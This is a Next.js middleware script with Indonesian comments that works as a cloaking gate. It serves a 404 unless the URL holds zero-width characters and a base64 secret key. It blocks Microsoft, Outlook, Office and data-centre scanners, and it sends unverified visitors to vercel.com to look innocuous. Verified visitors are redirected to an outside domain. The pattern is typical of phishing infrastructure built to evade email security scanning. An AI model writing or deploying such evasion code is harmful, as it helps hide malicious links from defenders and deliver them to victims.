import { NextResponse } from 'next/server';

export default function middleware(req) {
  const url = new URL(req.url);
  const ua = req.headers.get('user-agent')?.toLowerCase() || '';
  const ip = req.headers.get('x-forwarded-for')?.split(',')[0] || req.ip || 'Unknown';
  
  // 1. KONFIGURASI KUNCI RAHASIA (Ganti 'AksesHore2026' sesuai keinginanmu)
  // Encode 'AksesHore2026' ke Base64 menjadi 'QWtzZXNIb3JlMjAyNg=='
  const KUNCI_RAHASIA_BASE64 = 'QWtzZXNIb3JlMjAyNg==';

  // 2. DETEKSI KUNCI GAIB (ZWC)
  const hasZwc = /[\u200B-\u200D\uFEFF]/.test(decodeURIComponent(url.pathname));

  // 3. LOGGING & BLOCK UNTUK AKSES TANPA ZWC (PATH POLOS)
  if (!hasZwc && url.pathname === '/') {
    const isLikelyBot = /bot|spider|crawler|scanner|microsoft|outlook|office/i.test(ua) || ua.length < 30;
    const label = isLikelyBot ? "⚠️ BOT SCANNING (NO ZWC)" : "👤 MANUAL ACCESS (NO ZWC)";
    
    console.log(`${label} | IP: ${ip} | UA: ${ua}`);
    return new Response('404 Not Found', { status: 404 });
  }

  // 4. BLOCK DATA CENTER & MICROSOFT (Filter untuk bot US/Corporate)
  const botIsps = ['microsoft', 'azure', 'amazon', 'aws', 'google cloud', 'digitalocean', 'hetzner', 'ovh'];
  const isServerIp = botIsps.some(isp => ua.includes(isp));
  const isMicrosoftBot = req.headers.has('x-ms-useragent') || ua.includes('office') || ua.includes('microsoft');

  if (isServerIp || isMicrosoftBot) {
    console.log(`❌ BLOCKED BOT (DC/MS): IP=${ip} | UA=${ua}`);
    return new Response('Error 403: Access Denied', { status: 403 });
  }

  // 5. FINGERPRINTING MANUSIA (Validasi Standar Browser)
  const hasAcceptLang = req.headers.has('accept-language'); 
  const hasAccept = req.headers.get('accept')?.includes('text/html');
  const isMobile = /iphone|ipad|android/.test(ua);
  const isDesktop = /windows|macintosh|linux/.test(ua);

  if (ua.length < 35 || !hasAcceptLang || !hasAccept || (!isMobile && !isDesktop)) {
    console.log(`❌ BLOCKED BOT (FINGERPRINT): IP=${ip} | UA=${ua}`);
    return new Response('Error 403: Access Denied', { status: 403 });
  }

  // 6. VERIFIKASI KUNCI STATIS BASE64
  // Mengambil data setelah tanda '?'
  const base64Data = url.search.startsWith('?') ? url.search.substring(1) : '';

  if (base64Data !== KUNCI_RAHASIA_BASE64) {
    console.log(`❌ REJECTED: WRONG/MISSING KEY | IP=${ip} | DATA=${base64Data}`);
    // Jika salah kunci, buang ke domain utama agar terlihat normal
    return NextResponse.redirect('https://vercel.com/');
  }

  // 7. SUCCESS REDIRECT & LOG
  console.log(`🚀 HUMAN SUCCESS: IP=${ip} | URL=${url.pathname} | KEY_VALID=TRUE`);
  
  const targetUrl = 'https://nusaindahrp.com/?dev';
  return new Response(
    `<html><head><meta http-equiv="refresh" content="0;url=${targetUrl}"></head><body><script>window.location.href="${targetUrl}"</script></body></html>`,
    {
      status: 200,
      headers: { 'Content-Type': 'text/html' }
    }
  );
}
